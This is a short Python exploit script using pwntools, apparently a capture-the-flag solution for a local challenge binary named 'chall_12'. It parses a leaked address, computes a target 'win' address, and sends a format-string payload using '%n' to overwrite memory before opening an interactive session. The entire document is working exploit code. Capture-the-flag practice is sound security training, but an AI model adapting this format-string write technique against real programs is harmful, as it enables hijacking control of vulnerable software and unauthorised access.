#This works, trust me; just be patient.
from pwn import *
context.arch="i386"
p = process("./chall_12")
p.recvuntil(": ")
leak = int(p.recvline().strip(),16)
print(hex(leak))
win = leak-162
payload = b"%1$" + str(win).encode() + b"d" b"%21$n\x00"
payload += b"a" * (0x40 - 8 - len(payload))
payload += p32(leak+8313) + b'\x00'
print(payload)
p.sendline(payload)
p.recvline()
p.interactive()
